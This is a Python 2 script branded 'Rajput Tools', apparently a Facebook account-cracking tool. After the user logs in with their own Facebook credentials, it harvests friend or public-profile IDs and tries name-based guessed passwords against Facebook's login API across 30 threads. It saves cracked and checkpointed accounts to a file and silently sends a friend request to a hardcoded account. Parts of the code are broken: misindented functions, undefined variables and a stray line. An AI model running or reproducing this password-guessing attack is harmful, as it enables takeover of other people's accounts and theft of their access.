#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Rana_Nadeem_Rajput
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#03082503426


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)
####colours####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:BlackTiger-Error404
##### LOGO #####
logo = """
\x1b[1;91m██████╗░░█████╗░███╗░░██╗░█████╗░
\x1b[1;91m██╔══██╗██╔══██╗████╗░██║██╔══██╗
\x1b[1;91m██████╔╝███████║██╔██╗██║███████║
\x1b[1;91m██╔══██╗██╔══██║██║╚████║██╔══██║
\x1b[1;91m██║░░██║██║░░██║██║░╚███║██║░░██║
\x1b[1;91m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
\x1b[1;91m███████████████████████████████████████████████████████████████████████████
\x1b[1;91m██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
\x1b[1;91m██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
\x1b[1;91m██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
\x1b[1;91m██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
\x1b[1;91m██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
\x1b[1;91m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░"""           

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mRajputBarand█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\x1b[1;91m██████╗░░█████╗░███╗░░██╗░█████╗░
\x1b[1;91m██╔══██╗██╔══██╗████╗░██║██╔══██╗
\x1b[1;91m██████╔╝███████║██╔██╗██║███████║
\x1b[1;91m██╔══██╗██╔══██║██║╚████║██╔══██║
\x1b[1;91m██║░░██║██║░░██║██║░╚███║██║░░██║
\x1b[1;91m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
\x1b[1;91m███████████████████████████████████████████████████████████████████████████
\x1b[1;91m██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
\x1b[1;91m██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
\x1b[1;91m██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
\x1b[1;91m██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
\x1b[1;91m██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
\x1b[1;91m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░ 
\x1b[1;91m\033[1;91m◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆
\033[1;92m𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐑𝐀𝐉𝐏𝐔𝐓 𝐓𝐎𝐎𝐋𝐒                    
\033[1;92m𝐑𝐀𝐍𝐀 𝐖𝐇𝐀𝐓𝐒𝐀𝐏
\033[1;91m   03082503426
\033[1;91m𝐁𝐑𝐀𝐍𝐃𝐄𝐃 𝐑𝐀𝐍𝐀                 
\033[1;91m◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆◆❃☸❃◆"""
CorrectUsername = "Rana"
CorrectPassword = "Nadeem"


loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in Rajput_Tools as " + username
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
        
  ##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;91m[1]\033[1;47m\033[1;31mLogin With Facebook              \033[1;0m"
        time.sleep(0.05)
        print "\033[1;92m[2]\033[1;47m\033[1;31mLogin With Token                 \033[1;0m"
        time.sleep(0.05)
        print "\033[1;96m[0]\033[1;47m\033[1;31mExit                             \033[1;0m"
	time.sleep(0.05)
	pilih_login()
	
	def pilih_login():
	peak = raw_input("\n\033[1;97m[+] \033[0;31mSelect Option: \033[1;91m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenzlogo
elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo                
		print "\033[1;97m•-----------------\033[1;37mRANA_NADEEM\033[1;97m-----------------•"
		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
		print('	' )
		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
		pwd = raw_input('\033[1;97m[+] \x1b[1;97mPassword\x1b[1;97m    : \x1b[1;97m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\033[1;47m\033[1;91mRana_Nadeem Login Successful\033[1;0m'
				os.system('xdg-open https://youtu.be/_nr3g4imVxI')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97m∆CP∆ Creat A New Account")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;97mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97m∆CP∆Creat A New Account"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:Rana_Nadeem
	print logo
	print "   \033[1;33;40m     [1] \033[1;33;40m  Let's Clone With Rajput Tools"	
	print "   \033[1;33;40m     [2] \033[1;33;40m  Update Rajput_Tools"																														
	print "   \033[1;33;40m     [0] \033[1;33;40m  LOgOuT"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄Rana Nadeem Rajput►════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "     \x1b[1;33;40m [1] \033[1;33;40m[Rana]> Crack Your Ferinds"
	print "     \x1b[1;33;40m [2] \033[1;33;40m[Rana]> Crack From Public ID"
	print "     \x1b[1;33;40m [3] \033[1;33;40m[Rana]> Hack Bruteforce"
	print "     \x1b[1;33;40m [4] \033[1;33;40m[Rana]> Hack From File"
	print "     \x1b[1;33;40m [0] \033[1;33;40m[Rana]> Back"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;93m[Rana] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("          \033[1;96m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"          \033[1;31;40m[Rana] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;92m[Rana] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"          \033[1;35;40m[Rana] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "          \033[1;36;40m[Rana] Total IDs : \033[1;94m"+str(len(id))
	jalan('          \033[1;34;40m[Rana] Rajput_Tools Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("                    \r\033[1;32;40m          [Rana] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;93m ❈           \x1b[1;97mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
	print "   \033[1;92m●════════════════◄Rana►════════════════●"

	jalan('     \033[1;97mRana_Nadeem_Rajput start cloning Wait...')
	print  "  \033[1;92m●════════════════◄Rana►════════════════●" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '          \x1b[1;92m[Hack] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' ✔ ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[Rana.cp] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' ✔ ' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '          \x1b[1;92m[Hack] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' ✔ ' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '          \x1b[1;36;40m[Rana.cp] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' ✔ ' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' ✔ ' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '          \x1b[1;36;40m[Rana.cp] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' ✔ ' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['first_name']+'1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' ✔ ' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '          \x1b[1;36;40m[Rana.cp] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' ✔ ' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' ✔ ' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '          \x1b[1;36;40m[Rana.cp] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' ✔ ' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['last_name']+'123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass6 + ' ✔ ' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '          \x1b[1;36;40m[Rana.cp] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' ✔ ' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = 'Pakistan'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '          \x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' ✔ ' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '          \x1b[1;36;40m[Rana.cp] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' ✔ ' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal Rana.Hack/\x1b[1;93mRana.cp \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
